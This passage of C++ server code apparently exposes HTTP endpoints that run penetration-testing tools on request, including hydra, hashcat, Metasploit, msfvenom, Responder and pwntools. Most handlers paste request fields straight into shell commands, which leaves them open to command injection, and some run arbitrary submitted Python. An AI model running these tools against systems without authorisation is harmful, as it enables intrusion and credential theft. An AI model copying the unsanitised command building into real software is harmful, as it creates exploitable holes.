  svr.Post("/api/tools/whatweb", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        "-a 3 " + b.value("target", "") + " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("whatweb", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/jaeles", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "scan -u " + b.value("url", "");
    std::string sig = b.value("signatures", "");
    if (!sig.empty())
      args += " -s " + sig;
    args += " -c " + std::to_string(b.value("threads", 20)) + " -t " +
            std::to_string(b.value("timeout", 20));
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("jaeles", args, b.value("use_cache", true));
    send_json(res, r);
  });

  // ── RECON / OSINT ──────────────────────────────────────────────────────
  svr.Post("/api/tools/amass", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("mode", "enum") + " -d " +
                       b.value("domain", "") + " " +
                       b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("amass", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/subfinder", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-d " + b.value("domain", "");
    if (b.value("silent", true))
      args += " -silent";
    if (b.value("all_sources", false))
      args += " -all";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("subfinder", args, b.value("use_cache", true));
    if (!r["success"].get<bool>()) {
      g_telemetry.commands_failed++;
      if (b.value("use_recovery", false))
        r["alternative_tool_suggested"] = "amass";
    }
    send_json(res, r);
  });

  svr.Post("/api/tools/katana", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-u " + b.value("url", "") + " -d " +
                       std::to_string(b.value("depth", 3));
    if (b.value("js_crawl", true))
      args += " -jc";
    if (b.value("form_extraction", true))
      args += " -fx";
    if (b.value("output_format", "json") == "json")
      args += " -jsonl";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("katana", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/gau", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("domain", "");
    std::string prov = b.value("providers", "");
    if (!prov.empty())
      args += " --providers " + prov;
    if (b.value("include_subs", true))
      args += " --subs";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("gau", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/waybackurls", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("domain", "");
    if (b.value("get_versions", false))
      args += " --get-versions";
    if (b.value("no_subs", false))
      args += " --no-subs";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("waybackurls", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/hakrawler", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string url = b.value("url", "");
    std::string args = " -d " + std::to_string(b.value("depth", 2));
    if (b.value("forms", true))
      args += " -s";
    args += " -u " + b.value("additional_args", "");
    std::string cmd = "echo '" + url + "' | hakrawler" + args;
    g_telemetry.commands_executed++;
    auto cr = exec_command(cmd, DEFAULT_TIMEOUT);
    bool ok = cr.exit_code == 0;
    if (!ok)
      g_telemetry.commands_failed++;
    send_json(res, {{"success", ok},
                    {"stdout", cr.output},
                    {"stderr", ""},
                    {"execution_time", cr.execution_time}});
  });

  svr.Post("/api/tools/httpx", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", b.value("targets", ""));
    std::string args = target.empty() ? "" : "-l " + target;
    if (b.value("probe", true))
      args += " -probe";
    if (b.value("tech_detect", false))
      args += " -tech-detect";
    if (b.value("status_code", false))
      args += " -status-code";
    if (b.value("content_length", false))
      args += " -content-length";
    if (b.value("title", false))
      args += " -title";
    if (b.value("web_server", false))
      args += " -web-server";
    args += " -t " + std::to_string(b.value("threads", 50)) + " " +
            b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("httpx", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/arjun", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        "-u " + b.value("url", "") + " -m " + b.value("method", "GET");
    std::string wl = b.value("wordlist", "");
    if (!wl.empty())
      args += " -w " + wl;
    args += " -t " + std::to_string(b.value("threads", 25)) + " " +
            b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("arjun", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/paramspider", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-d " + b.value("domain", "");
    std::string out = b.value("output", b.value("output_file", ""));
    if (!out.empty())
      args += " -o " + out;
    args += " -l " + std::to_string(b.value("level", b.value("level", 2))) +
            " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("paramspider", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/x8", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        "-u " + b.value("url", "") + " -X " + b.value("method", "GET");
    std::string wl = b.value("wordlist", "");
    if (!wl.empty())
      args += " -w " + wl;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("x8", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/fierce", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--domain " + b.value("domain", "");
    std::string dns = b.value("dns_server", "");
    if (!dns.empty())
      args += " --dns-servers " + dns;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("fierce", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/dnsenum", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("domain", "");
    std::string dns = b.value("dns_server", "");
    if (!dns.empty())
      args += " --dnsserver " + dns;
    std::string wl = b.value("wordlist", "");
    if (!wl.empty())
      args += " -f " + wl;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("dnsenum", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/anew", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string out = b.value("output_file", "");
    std::string inp = b.value("input_data", "");
    std::string cmd = "echo '" + inp + "' | anew " + out + " " +
                      b.value("additional_args", "");
    auto cr = exec_command(cmd, 30);
    send_json(res, {{"success", cr.exit_code == 0}, {"stdout", cr.output}});
  });

  svr.Post("/api/tools/qsreplace", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string urls = b.value("urls", "");
    std::string rep = b.value("replacement", "FUZZ");
    std::string cmd = "echo '" + urls + "' | qsreplace " + rep + " " +
                      b.value("additional_args", "");
    auto cr = exec_command(cmd, 30);
    send_json(res, {{"success", cr.exit_code == 0}, {"stdout", cr.output}});
  });

  svr.Post("/api/tools/uro", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string cmd = "echo '" + b.value("urls", "") + "' | uro " +
                      b.value("additional_args", "");
    auto cr = exec_command(cmd, 30);
    send_json(res, {{"success", cr.exit_code == 0}, {"stdout", cr.output}});
  });

  // ── SMB / WINDOWS ──────────────────────────────────────────────────────
  svr.Post("/api/tools/enum4linux", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        b.value("additional_args", "-a") + " " + b.value("target", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("enum4linux", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/enum4linux-ng", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("target", "");
    std::string u = b.value("username", "");
    if (!u.empty())
      args += " -u " + u;
    std::string p = b.value("password", "");
    if (!p.empty())
      args += " -p " + p;
    std::string d = b.value("domain", "");
    if (!d.empty())
      args += " -d " + d;
    if (b.value("shares", true))
      args += " -A";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("enum4linux-ng", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/netexec", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string proto = b.value("protocol", "smb");
    std::string args = proto + " " + b.value("target", "");
    std::string u = b.value("username", "");
    if (!u.empty())
      args += " -u " + u;
    std::string p = b.value("password", "");
    if (!p.empty())
      args += " -p " + p;
    std::string h = b.value("hash", "");
    if (!h.empty())
      args += " -H " + h;
    std::string m = b.value("module", "");
    if (!m.empty())
      args += " -M " + m;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("netexec", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/smbmap", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-H " + b.value("target", "");
    std::string u = b.value("username", "");
    if (!u.empty())
      args += " -u " + u;
    std::string p = b.value("password", "");
    if (!p.empty())
      args += " -p " + p;
    std::string d = b.value("domain", "");
    if (!d.empty())
      args += " -d " + d;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("smbmap", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/rpcclient", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string cmds =
        b.value("commands", "enumdomusers;enumdomgroups;querydominfo");
    std::string u = b.value("username", "");
    std::string p = b.value("password", "");
    std::string cred = (u.empty()) ? "%" : u + "%" + p;
    std::string target = b.value("target", "");
    std::string output;
    std::istringstream ss(cmds);
    std::string cmd;
    while (std::getline(ss, cmd, ';')) {
      if (!cmd.empty()) {
        auto cr = exec_command(
            "rpcclient -c '" + cmd + "' -U " + cred + " " + target, 15);
        output += "=== " + cmd + " ===\n" + cr.output + "\n";
      }
    }
    send_json(res, {{"success", true}, {"stdout", output}});
  });

  svr.Post("/api/tools/responder", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string iface = b.value("interface", "eth0");
    std::string args = "-I " + iface;
    if (b.value("analyze", false))
      args += " -A";
    if (b.value("wpad", true))
      args += " -w On";
    if (b.value("force_wpad_auth", false))
      args += " -F On";
    if (b.value("fingerprint", false))
      args += " -f";
    args += " " + b.value("additional_args", "");
    int dur = b.value("duration", 300);
    int pid = launch_detached("responder " + args);
    std::thread([pid, dur]() {
      std::this_thread::sleep_for(std::chrono::seconds(dur));
      kill_process(pid);
    }).detach();
    send_json(res, {{"success", true},
                    {"pid", pid},
                    {"duration", dur},
                    {"message", "Responder launched in background"}});
  });

  // ── CREDENTIALS ────────────────────────────────────────────────────────
  svr.Post("/api/tools/hydra", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args;
    std::string u = b.value("username", "");
    std::string uf = b.value("username_file", "");
    std::string p = b.value("password", "");
    std::string pf = b.value("password_file", "");
    if (!u.empty())
      args += " -l " + u;
    if (!uf.empty())
      args += " -L " + uf;
    if (!p.empty())
      args += " -p " + p;
    if (!pf.empty())
      args += " -P " + pf;
    args += " " + b.value("additional_args", "") + " " + b.value("target", "") +
            " " + b.value("service", "ssh");
    g_telemetry.commands_executed++;
    auto r = run_tool("hydra", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/john", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("hash_file", "") + " --wordlist=" +
                       b.value("wordlist", "/usr/share/wordlists/rockyou.txt");
    std::string fmt = b.value("format", "");
    if (!fmt.empty())
      args += " --format=" + fmt;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("john", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/hashcat", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-m " + b.value("hash_type", "0") + " -a " +
                       b.value("attack_mode", "0");
    args += " " + b.value("hash_file", "");
    std::string wl = b.value("wordlist", "");
    if (!wl.empty())
      args += " " + wl;
    std::string mask = b.value("mask", "");
    if (!mask.empty())
      args += " " + mask;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("hashcat", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/hashpump", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        "-s " + b.value("signature", "") + " -d " + b.value("data", "") +
        " -k " + b.value("key_length", "") + " -a " +
        b.value("append_data", "") + " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("hashpump", args, b.value("use_cache", true));
    send_json(res, r);
  });

  // ── EXPLOITATION ───────────────────────────────────────────────────────
  svr.Post("/api/tools/metasploit", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string module = b.value("module", "");
    json opts = b.value("options", json::object());
    std::string rc = "use " + module + "\n";
    for (auto &[k, v] : opts.items())
      rc += "set " + k + " " + v.dump() + "\n";
    rc += "run\nexit\n";
    std::string rcpath =
        "/tmp/hsmsf_" + std::to_string(std::time(nullptr)) + ".rc";
    std::ofstream f(rcpath);
    f << rc;
    f.close();
    g_telemetry.commands_executed++;
    auto cr = exec_command("msfconsole -q -r " + rcpath, DEFAULT_TIMEOUT);
    fs::remove(rcpath);
    bool ok = cr.exit_code == 0;
    if (!ok)
      g_telemetry.commands_failed++;
    send_json(res, {{"success", ok}, {"stdout", cr.output}});
  });

  svr.Post("/api/tools/msfvenom", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-p " + b.value("payload", "");
    std::string fmt = b.value("format", "");
    if (!fmt.empty())
      args += " -f " + fmt;
    std::string out = b.value("output_file", "");
    if (!out.empty())
      args += " -o " + out;
    std::string enc = b.value("encoder", "");
    if (!enc.empty())
      args += " -e " + enc;
    std::string it = b.value("iterations", "");
    if (!it.empty())
      args += " -i " + it;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("msfvenom", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  // ── BINARY ANALYSIS ────────────────────────────────────────────────────
  svr.Post("/api/tools/gdb", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string binary = b.value("binary", "");
    std::string cmds = b.value("commands", "");
    std::string args = "--batch";
    if (!cmds.empty()) {
      std::string fname =
          "/tmp/hsgdb_" + std::to_string(std::time(nullptr)) + ".gdb";
      std::ofstream f(fname);
      std::istringstream ss(cmds);
      std::string c;
      while (std::getline(ss, c, ';'))
        if (!c.empty())
          f << c << "\n";
      args += " -x " + fname;
    }
    std::string sf = b.value("script_file", "");
    if (!sf.empty())
      args += " -x " + sf;
    args += " " + b.value("additional_args", "") + " " + binary;
    g_telemetry.commands_executed++;
    auto r = run_tool("gdb", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/gdb-peda", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string cmds = b.value("commands", "checksec;info functions");
    std::string args = "-q --batch -ex '" + cmds + "'";
    if (b.value("attach_pid", 0) > 0)
      args += " --pid=" + std::to_string(b.value("attach_pid", 0));
    std::string core = b.value("core_file", "");
    if (!core.empty())
      args += " " + core;
    args += " " + b.value("binary", "") + " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("gdb", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/radare2", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-q -c '" + b.value("commands", "aaa;afl") + "' " +
                       b.value("additional_args", "") + " " +
                       b.value("binary", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("r2", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/ghidra", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string binary = b.value("binary", "");
    std::string proj = b.value("project_name", "mantra_analysis");
    std::string script = b.value("script_file", "");
    int timeout = b.value("analysis_timeout", 300);
    std::string args = "/tmp/ghidra_" + proj + " " + proj + " -import " +
                       binary + " -analysisTimeoutPerFile " +
                       std::to_string(timeout);
    if (!script.empty())
      args += " -postScript " + script;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("analyzeHeadless", args, b.value("use_cache", true),
                      timeout + 30);
    send_json(res, r);
  });

  svr.Post("/api/tools/binwalk", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "";
    if (b.value("extract", false))
      args += " -e";
    args +=
        " " + b.value("additional_args", "") + " " + b.value("file_path", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("binwalk", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/checksec", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--file=" + b.value("binary", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("checksec", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/strings", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-n " + std::to_string(b.value("min_len", 4)) + " " +
                       b.value("additional_args", "") + " " +
                       b.value("file_path", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("strings", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/xxd", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "";
    std::string off = b.value("offset", "0");
    if (off != "0")
      args += " -s " + off;
    std::string len = b.value("length", "");
    if (!len.empty())
      args += " -l " + len;
    args +=
        " " + b.value("additional_args", "") + " " + b.value("file_path", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("xxd", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/objdump", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("disassemble", true) ? "-d " : "";
    args += b.value("additional_args", "") + " " + b.value("binary", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("objdump", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/ropgadget", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--binary " + b.value("binary", "");
    std::string gt = b.value("gadget_type", "");
    if (!gt.empty())
      args += " --gadgets " + gt;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("ROPgadget", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/ropper", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--file " + b.value("binary", "") + " --type " +
                       b.value("gadget_type", "rop");
    std::string arch = b.value("arch", "");
    if (!arch.empty())
      args += " --arch " + arch;
    std::string search = b.value("search_string", "");
    if (!search.empty())
      args += " --search '" + search + "'";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("ropper", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/one-gadget", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("libc_path", "") + " -l " +
                       std::to_string(b.value("level", 1)) + " " +
                       b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("one_gadget", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/pwntools", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string script = b.value("script_content", "");
    if (script.empty()) {
      send_json(res, {{"success", false}, {"error", "script_content required"}},
                400);
      return;
    }
    std::string fname =
        "/tmp/hspwn_" + std::to_string(std::time(nullptr)) + ".py";
    std::ofstream f(fname);
    f << "from pwn import *\n" << script;
    f.close();
    g_telemetry.commands_executed++;
    auto cr = exec_command("python3 " + fname, DEFAULT_TIMEOUT);
    fs::remove(fname);
    bool ok = cr.exit_code == 0;
    if (!ok)
      g_telemetry.commands_failed++;
    send_json(res, {{"success", ok}, {"stdout", cr.output}});
  });

  svr.Post("/api/tools/angr", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string binary = b.value("binary", "");
    std::string script = b.value("script_content", "");
    if (script.empty()) {
      script = "import angr\nproj=angr.Project('" + binary +
               "',auto_load_libs=False)\n"
               "print('Entry:',hex(proj.entry))\ncfg=proj.analyses.CFGFast()\n"
               "print('Functions:',len(list(cfg.kb.functions)))";
    }
    std::string fname =
        "/tmp/hsangr_" + std::to_string(std::time(nullptr)) + ".py";
    std::ofstream f(fname);
    f << script;
    f.close();
    g_telemetry.commands_executed++;
    auto cr = exec_command("python3 " + fname, 300);
    fs::remove(fname);
    send_json(res, {{"success", cr.exit_code == 0}, {"stdout", cr.output}});
  });

  svr.Post("/api/tools/pwninit", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--bin " + b.value("binary", "");
    std::string libc = b.value("libc", "");
    if (!libc.empty())
      args += " --libc " + libc;
    std::string ld = b.value("ld", "");
    if (!ld.empty())
      args += " --ld " + ld;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("pwninit", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/libc-database", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string action = b.value("action", "find");
    std::string args = b.value("symbols", b.value("libc_id", "")) + " " +
                       b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r =
        run_tool("./libc-database/" + action, args, b.value("use_cache", true));
    send_json(res, r);
  });

  // ── FORENSICS ──────────────────────────────────────────────────────────
  svr.Post("/api/tools/volatility", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-f " + b.value("memory_file", "") + " " +
                       b.value("plugin", "imageinfo");
    std::string prof = b.value("profile", "");
    if (!prof.empty())
      args = "--profile=" + prof + " " + args;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("volatility", args, b.value("use_cache", true), 600);
    send_json(res, r);
  });

  svr.Post("/api/tools/volatility3", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-f " + b.value("memory_file", "") + " " +
                       b.value("plugin", "windows.pslist.PsList") + " " +
                       b.value("additional_args", "");
    std::string out = b.value("output_file", "");
    if (!out.empty())
      args += " -o " + out;
    g_telemetry.commands_executed++;
    auto r = run_tool("vol", args, b.value("use_cache", true), 600);
    send_json(res, r);
  });

  svr.Post("/api/tools/foremost", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-i " + b.value("input_file", "") + " -o " +
                       b.value("output_dir", "/tmp/foremost_output");
    std::string types = b.value("file_types", "");
    if (!types.empty())
      args += " -t " + types;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("foremost", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/steghide", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string action = b.value("action", "extract");
    std::string args = action + " -sf " + b.value("cover_file", "");
    std::string pass = b.value("passphrase", "");
    args += " -p '" + pass + "'";
    std::string out = b.value("output_file", "");
    if (!out.empty())
      args += " -xf " + out;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("steghide", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/exiftool", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "";
    std::string fmt = b.value("output_format", "");
    if (fmt == "json")
      args += " -json";
    else if (fmt == "xml")
      args += " -xml";
    std::string tags = b.value("tags", "");
    if (!tags.empty())
      args += " -" + tags;
    args +=
        " " + b.value("additional_args", "") + " " + b.value("file_path", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("exiftool", args, b.value("use_cache", true));
    send_json(res, r);
  });

  // ── CLOUD / CONTAINERS ─────────────────────────────────────────────────
  svr.Post("/api/tools/prowler", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("provider", "aws");
    std::string prof = b.value("profile", "default");
    if (!prof.empty())
      args += " --profile " + prof;
    std::string reg = b.value("region", "");
    if (!reg.empty())
      args += " -r " + reg;
    std::string chk = b.value("checks", "");
    if (!chk.empty())
      args += " -c " + chk;
    args += " -o " + b.value("output_dir", "/tmp/prowler_output") +
            " --output-formats " + b.value("output_format", "json");
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("prowler", args, b.value("use_cache", true), 600);
    send_json(res, r);
  });

  svr.Post("/api/tools/trivy", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("scan_type", "image") + " --format " +
                       b.value("output_format", "json");
    std::string sev = b.value("severity", "");
    if (!sev.empty())
      args += " --severity " + sev;
    std::string out = b.value("output_file", "");
    if (!out.empty())
      args += " --output " + out;
    args += " " + b.value("additional_args", "") + " " + b.value("target", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("trivy", args, b.value("use_cache", true), 300);
    send_json(res, r);
  });

  svr.Post("/api/tools/scout-suite", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = b.value("provider", "aws");
    std::string prof = b.value("profile", "default");
    if (!prof.empty())
      args += " --profile " + prof;
    args += " --report-dir " + b.value("report_dir", "/tmp/scout-suite");
    std::string svc = b.value("services", "");
    if (!svc.empty())
      args += " --services " + svc;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("scout_suite", args, b.value("use_cache", true), 600);
    send_json(res, r);
  });

  svr.Post("/api/tools/cloudmapper", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string action = b.value("action", "collect");
    std::string args = action;
    std::string acct = b.value("account", "");
    if (!acct.empty())
      args += " --account " + acct;
    args += " --config " + b.value("config", "config.json") + " " +
            b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("python3 cloudmapper.py", args,
                      b.value("use_cache", true), 300);
    send_json(res, r);
  });

  svr.Post("/api/tools/pacu", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--session " + b.value("session_name", "mantra_session");
    std::string mods = b.value("modules", "");
    if (!mods.empty())
      args += " --module " + mods;
    std::string reg = b.value("regions", "");
    if (!reg.empty())
      args += " --regions " + reg;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("pacu", args, b.value("use_cache", true), 600);
    send_json(res, r);
  });

  svr.Post("/api/tools/kube-hunter", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--report " + b.value("report", "json");
    std::string remote = b.value("remote", "");
    if (!remote.empty())
      args += " --remote " + remote;
    std::string cidr = b.value("cidr", "");
    if (!cidr.empty())
      args += " --cidr " + cidr;
    if (b.value("active", false))
      args += " --active";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("kube-hunter", args, b.value("use_cache", true), 300);
    send_json(res, r);
  });

  svr.Post("/api/tools/kube-bench", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--json";
    std::string tgt = b.value("targets", "");
    if (!tgt.empty())
      args += " --targets " + tgt;
    std::string ver = b.value("version", "");
    if (!ver.empty())
      args += " --version " + ver;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("kube-bench", args, b.value("use_cache", true), 300);
    send_json(res, r);
  });

  svr.Post("/api/tools/docker-bench-security",
           [](const Request &req, Response &res) {
             auto b = parse_body(req);
             std::string args = b.value("additional_args", "");
             g_telemetry.commands_executed++;
             auto r = run_tool("docker-bench-security", args,
                               b.value("use_cache", true));
             send_json(res, r);
           });

  svr.Post("/api/tools/clair", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string image = b.value("image", "");
    if (image.empty()) {
      send_json(res, {{"success", false}, {"error", "image required"}}, 400);
      return;
    }
    std::string args = "--config " +
                       b.value("config", "/etc/clair/config.yaml") + " " +
                       b.value("additional_args", "") + " " + image;
    g_telemetry.commands_executed++;
    auto r = run_tool("clair-scanner", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/falco", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-c " + b.value("config_file", "/etc/falco/falco.yaml");
    std::string rf = b.value("rules_file", "");
    if (!rf.empty())
      args += " -r " + rf;
    args += " -o json_output=true " + b.value("additional_args", "");
    int dur = b.value("duration", 60);
    int pid = launch_detached("falco " + args);
    std::thread([pid, dur]() {
      std::this_thread::sleep_for(std::chrono::seconds(dur));
      kill_process(pid);
    }).detach();
    send_json(res, {{"success", true},
                    {"pid", pid},
                    {"duration", dur},
                    {"message", "Falco monitoring started"}});
  });

  svr.Post("/api/tools/checkov", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-d " + b.value("directory", ".");
    std::string fw = b.value("framework", "");
    if (!fw.empty())
      args += " --framework " + fw;
    std::string ck = b.value("check", "");
    if (!ck.empty())
      args += " --check " + ck;
    std::string sk = b.value("skip_check", "");
    if (!sk.empty())
      args += " --skip-check " + sk;
    args += " -o " + b.value("output_format", "json") + " " +
            b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("checkov", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/terrascan", [](const Request &req, Response &res) {
    auto b = parse_body(req);
